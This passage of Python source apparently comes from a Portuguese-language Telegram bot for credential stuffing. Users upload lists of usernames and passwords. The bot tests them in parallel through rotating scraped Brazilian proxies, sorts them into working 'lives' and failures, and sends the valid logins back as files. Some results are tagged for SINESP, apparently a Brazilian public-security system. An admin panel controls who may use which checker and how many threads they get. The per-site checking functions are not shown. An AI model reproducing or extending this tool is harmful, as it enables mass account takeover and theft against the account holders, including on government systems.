            Path(tmp).unlink(missing_ok=True)
        ctx.user_data.clear()
        await q.edit_message_text("❌ Cancelado.")
        return ConversationHandler.END

    if val not in get_user_checkers(uid):
        await q.answer("⛔ Sem permissão para este checker.", show_alert=True)
        return CHOOSE_CHECKER

    ctx.user_data["checker"] = val

    if ctx.user_data.get("tmp_file"):
        await q.edit_message_text(
            f"✅ *{CHECKERS[val]}*\n\n🔤 Qual o *delimitador*?",
            parse_mode="Markdown",
            reply_markup=_kb_delim(),
        )
        return CHOOSE_DELIM

    await q.edit_message_text(
        f"✅ *{CHECKERS[val]}*\n\n📂 Agora envie o arquivo *.txt* com as credenciais.",
        parse_mode="Markdown",
    )
    return WAIT_FILE

async def on_delim_chosen(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q   = update.callback_query
    await q.answer()
    val = q.data.split(":", 1)[1]

    if val == "cancel":
        tmp = ctx.user_data.pop("tmp_file", None)
        if tmp:
            Path(tmp).unlink(missing_ok=True)
        ctx.user_data.clear()
        await q.edit_message_text("❌ Cancelado.")
        return ConversationHandler.END

    checker  = ctx.user_data.pop("checker", None)
    tmp_file = ctx.user_data.pop("tmp_file", None)
    uid      = q.from_user.id

    if not checker or not tmp_file:
        await q.edit_message_text("❌ Erro interno. Tente novamente.")
        ctx.user_data.clear()
        return ConversationHandler.END

    await q.edit_message_text(
        f"⏳ *{CHECKERS[checker]}* iniciando com delimitador `{val}`...",
        parse_mode="Markdown",
    )

    asyncio.create_task(
        _run_checker(q.message.chat_id, uid, checker, tmp_file, val, ctx.application)
    )
    return ConversationHandler.END

# ── Admin callback handler ──────────────────────────────────────────────────────
async def on_admin_cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q   = update.callback_query
    await q.answer()
    uid = q.from_user.id
    if not is_admin(uid):
        return

    data = q.data

    if data in ("adm:back", "adm:menu"):
        total  = len(list_users())
        authed = sum(1 for u in list_users() if u[3])
        await q.edit_message_text(
            f"⚡ *Painel Admin*\n`Total: {total}  |  Auth: {authed}`",
            parse_mode="Markdown",
            reply_markup=_kb_admin(),
        )

    elif data == "adm:users":
        users = list_users()
        if not users:
            await q.edit_message_text(
                "Nenhum usuário ainda.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙", callback_data="adm:back")]]),
            )
            return
        await q.edit_message_text(
            "👥 *Usuários:*", parse_mode="Markdown", reply_markup=_kb_users(users)
        )

    elif data == "adm:proxygen":
        await q.edit_message_text("🌐 Gerando proxies BR... aguarde ⏳")
        asyncio.create_task(_run_proxy_gen(q.message.chat_id, ctx.application))

    elif data == "adm:status":
        users  = list_users()
        authed = sum(1 for u in users if u[3])
        await q.edit_message_text(
            f"📊 *Status do Bot*\n```\nUsuários:    {len(users)}\nAutorizados: {authed}```",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Voltar", callback_data="adm:back")]]),
        )

    elif data.startswith("usr:"):
        target = int(data.split(":")[1])
        row    = _db("SELECT user_id, username, full_name, is_auth FROM users WHERE user_id=?", target, fetch="one")
        if not row:
            await q.edit_message_text("Usuário não encontrado.")
            return
        _, uname, fname, is_a = row
        name = fname or uname or str(target)
        threads = get_user_threads(target)
        await q.edit_message_text(
            f"👤 *{name}*\n`ID: {target}`\n{'✅ Autorizado' if is_a else '❌ Bloqueado'} · {threads}T",
            parse_mode="Markdown",
            reply_markup=_kb_manage(target, bool(is_a)),
        )

    elif data.startswith("auth:"):
        _, target, val = data.split(":")
        target = int(target)
        authorize_user(target, val == "1")
        row    = _db("SELECT user_id, username, full_name, is_auth FROM users WHERE user_id=?", target, fetch="one")
        _, uname, fname, is_a = row
        name = fname or uname or str(target)
        threads = get_user_threads(target)
        await q.edit_message_text(
            f"👤 *{name}*\n`ID: {target}`\n{'✅ Autorizado' if is_a else '❌ Bloqueado'} · {threads}T",
            parse_mode="Markdown",
            reply_markup=_kb_manage(target, bool(is_a)),
        )
        try:
            msg = (
                "✅ Seu acesso foi *liberado*! Envie /start para começar."
                if val == "1"
                else "⛔ Seu acesso foi *revogado*."
            )
            await ctx.application.bot.send_message(target, msg, parse_mode="Markdown")
        except Exception:
            pass

    elif data.startswith("perm:"):
        _, target, checker = data.split(":", 2)
        target = int(target)
        toggle_checker(target, checker)
        row    = _db("SELECT user_id, username, full_name, is_auth FROM users WHERE user_id=?", target, fetch="one")
        _, uname, fname, is_a = row
        name = fname or uname or str(target)
        threads = get_user_threads(target)
        await q.edit_message_text(
            f"👤 *{name}*\n`ID: {target}`\n{'✅ Autorizado' if is_a else '❌ Bloqueado'} · {threads}T",
            parse_mode="Markdown",
            reply_markup=_kb_manage(target, bool(is_a)),
        )

    elif data.startswith("thd:"):
        _, target, n = data.split(":")
        target = int(target)
        set_user_threads(target, int(n))
        row    = _db("SELECT user_id, username, full_name, is_auth FROM users WHERE user_id=?", target, fetch="one")
        _, uname, fname, is_a = row
        name = fname or uname or str(target)
        await q.edit_message_text(
            f"👤 *{name}*\n`ID: {target}`\n{'✅ Autorizado' if is_a else '❌ Bloqueado'} · {int(n)}T",
            parse_mode="Markdown",
            reply_markup=_kb_manage(target, bool(is_a)),
        )

    elif data.startswith("delpx:"):
        target = int(data.split(":")[1])
        set_user_proxies(target, "")
        row    = _db("SELECT user_id, username, full_name, is_auth FROM users WHERE user_id=?", target, fetch="one")
        _, uname, fname, is_a = row
        name = fname or uname or str(target)
        threads = get_user_threads(target)
        await q.answer("Proxies do usuário removidos!", show_alert=True)
        await q.edit_message_text(
            f"👤 *{name}*\n`ID: {target}`\n{'✅ Autorizado' if is_a else '❌ Bloqueado'} · {threads}T",
            parse_mode="Markdown",
            reply_markup=_kb_manage(target, bool(is_a)),
        )

# ── Background: run checker ─────────────────────────────────────────────────────
async def _run_checker(chat_id, uid, checker, tmp_file, delim, app):
    try:
        path = Path(tmp_file)
        try:
            lines = [
                l.strip()
                for l in path.read_text(encoding="utf-8", errors="ignore").splitlines()
                if l.strip() and delim in l
            ]
        finally:
            path.unlink(missing_ok=True)

        if not lines:
            await app.bot.send_message(chat_id, "⚠️ Nenhuma credencial válida encontrada.")
            return

        total     = len(lines)
        fn        = CHECKER_FN[checker]
        name      = CHECKERS[checker]
        lives: list[str] = []
        nvinc: list[str] = []
        erros: list[str] = []
        checked   = 0
        last_edit = time.time()

        prog = await app.bot.send_message(
            chat_id, f"🔄 *{name}* · `0/{total}`", parse_mode="Markdown"
        )

        px_count = len(get_user_proxies(uid))
        threads  = get_user_threads(uid)

        def px_fn():
            return _proxy_for(uid)

        async def _process(line):
            nonlocal checked
            parts = line.split(delim, 1)
            if len(parts) < 2:
                return
            user, pwd = parts[0].strip(), parts[1].strip()
            if not user or not pwd:
                return
            result, extra = await asyncio.to_thread(fn, user, pwd, px_fn)
            checked += 1
            entry = f"{user}:{pwd}" + (f" | {extra}" if extra else "")
            if result == "live":
                lives.append(entry)
            elif result == "nvinculado":
                nvinc.append(f"{user}:{pwd}")
            elif result == "erro" and len(erros) < 5:
                erros.append(extra)

        async def _edit_progress():
            nonlocal last_edit
            now = time.time()
            if now - last_edit >= 3:
                try:
                    await prog.edit_text(
                        f"🔄 *{name}* · `{checked}/{total}` · ✅ `{len(lives)}`",
                        parse_mode="Markdown",
                    )
                    last_edit = now
                except Exception:
                    pass

        if threads > 1:
            sem = asyncio.Semaphore(threads)

            async def _sem_task(line):
                async with sem:
                    await _process(line)

            tasks = [asyncio.create_task(_sem_task(l)) for l in lines]
            for t in asyncio.as_completed(tasks):
                await t
                await _edit_progress()
        else:
            for line in lines:
                await _process(line)
                await _edit_progress()

        dies = total - len(lives) - len(nvinc)
        summary = (
            f"✅ *{name}* concluído!\n"
            f"```\n"
            f"Total   : {total}\n"
            f"Lives   : {len(lives)}\n"
            f"Dies    : {dies}\n"
            + (f"N.Vinc  : {len(nvinc)}\n" if nvinc else "")
            + f"Threads : {threads}\n"
            + f"Proxy   : {'ativo (' + str(px_count) + ')' if px_count else 'desativado'}\n"
            + "```"
        )
        await prog.edit_text(summary, parse_mode="Markdown")

        if erros:
            erro_txt = "\n".join(f"• `{e}`" for e in erros)
            await app.bot.send_message(
                chat_id,
                f"⚠️ *Amostra de erros:*\n{erro_txt}",
                parse_mode="Markdown",
            )

        if lives:
            out = TMP_DIR / f"live_{checker}_{uid}.txt"
            out.write_text("\n".join(lives), encoding="utf-8")
            with out.open("rb") as fh:
                await app.bot.send_document(
                    chat_id, document=fh,
                    filename=f"live_{checker}.txt",
                    caption=f"✅ {len(lives)} lives · {name}",
                )
            out.unlink(missing_ok=True)

        if nvinc:
            out = TMP_DIR / f"nvinc_{uid}.txt"
            out.write_text("\n".join(nvinc), encoding="utf-8")
            with out.open("rb") as fh:
                await app.bot.send_document(
                    chat_id, document=fh,
                    filename="nvinculado_sinesp.txt",
                    caption=f"🟠 {len(nvinc)} não vinculados · SINESP",
                )
            out.unlink(missing_ok=True)

        if not lives and not nvinc:
            await app.bot.send_message(chat_id, "☠️ Nenhum live encontrado.")

    except Exception as e:
        await app.bot.send_message(chat_id, f"❌ Erro: `{e}`", parse_mode="Markdown")

# ── Background: proxy tester ────────────────────────────────────────────────────
async def _run_proxy_test(uid, proxies, chat_id, app):
    try:
        total = len(proxies)
        msg   = await app.bot.send_message(chat_id, f"🔍 Testando 0/{total}...")
        vivos: list[str] = []
        sem   = asyncio.Semaphore(20)
        state = {"checked": 0, "last_edit": time.time()}

        async def _chk(p):
            async with sem:
                ok = await asyncio.to_thread(_check_proxy_alive, p)
                if ok:
                    vivos.append(p)
                state["checked"] += 1
                now = time.time()
                if now - state["last_edit"] >= 3:
                    try:
                        await msg.edit_text(f"🔍 Testando {state['checked']}/{total}... ✅ {len(vivos)}")
                        state["last_edit"] = now
                    except Exception:
                        pass

        await asyncio.gather(*[_chk(p) for p in proxies])
        set_user_proxies(uid, "\n".join(vivos))
        await msg.edit_text(
            f"✅ *Teste concluído!*\n"
            f"```\n"
            f"Testados : {total}\n"
            f"Vivos    : {len(vivos)}\n"
            f"Mortos   : {total - len(vivos)}\n"
            f"```",
            parse_mode="Markdown",
        )
    except Exception as e:
        await app.bot.send_message(chat_id, f"❌ Erro no teste: `{e}`", parse_mode="Markdown")

# ── Background: proxy generator ─────────────────────────────────────────────────
async def _run_proxy_gen(chat_id, app):
    try:
        msg     = await app.bot.send_message(chat_id, "🌐 Buscando proxies BR...")
        proxies = await asyncio.to_thread(_fetch_proxies)
        total   = len(proxies)

        if not total:
            await msg.edit_text("☠️ Nenhum proxy encontrado nas fontes.")
            return

        await msg.edit_text(f"🌐 {total} encontrados. Checando conectividade...")

        vivos: list[str] = []
        sem   = asyncio.Semaphore(80)

        async def _chk(p):
            async with sem:
                ok = await asyncio.to_thread(_check_proxy_alive, p)
                if ok:
                    vivos.append(p)

        await asyncio.gather(*[_chk(p) for p in proxies])

        if vivos:
            out = TMP_DIR / f"proxys_br_{int(time.time())}.txt"
            out.write_text("\n".join(vivos), encoding="utf-8")
            await msg.edit_text(f"✅ {len(vivos)}/{total} proxies vivos!")
            with out.open("rb") as fh:
                await app.bot.send_document(
                    chat_id, document=fh,
                    filename="proxys_br.txt",
                    caption=f"🌐 {len(vivos)} proxies BR vivos",
                )
            out.unlink(missing_ok=True)
        else:
            await msg.edit_text("☠️ Nenhum proxy vivo encontrado.")

    except Exception as e:
        await app.bot.send_message(chat_id, f"❌ Erro proxy gen: `{e}`", parse_mode="Markdown")

# ── Main ────────────────────────────────────────────────────────────────────────
def main():
    db_init()

    app = Application.builder().token(TOKEN).build()

    # Proxy upload handler must run BEFORE the conversation to avoid
    # documents being swallowed by the conv state machine.
    app.add_handler(
        MessageHandler(filters.Document.ALL, handle_proxy_upload),
        group=-1,
    )

    conv = ConversationHandler(
        entry_points=[
            CommandHandler("start",              cmd_start),
            MessageHandler(filters.Document.ALL, on_document),
        ],
        states={
            CHOOSE_CHECKER: [CallbackQueryHandler(on_checker_chosen, pattern=r"^chk:")],
            WAIT_FILE:      [MessageHandler(filters.Document.ALL,    on_document)],
            CHOOSE_DELIM:   [CallbackQueryHandler(on_delim_chosen,   pattern=r"^dl:")],
        },
        fallbacks=[CommandHandler("cancel", cmd_cancel)],
        per_user=True,
        per_chat=False,
    )

    app.add_handler(conv)
    app.add_handler(CommandHandler("admin",   cmd_admin))
    app.add_handler(CommandHandler("myproxy", cmd_myproxy))
    app.add_handler(CommandHandler("perfil",  cmd_perfil))
    app.add_handler(CallbackQueryHandler(on_proxy_cb,  pattern=r"^px:"))
    app.add_handler(CallbackQueryHandler(on_admin_cb,  pattern=r"^(adm:|usr:|auth:|perm:|thd:|delpx:)"))

    print("✅ Bot iniciado.")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
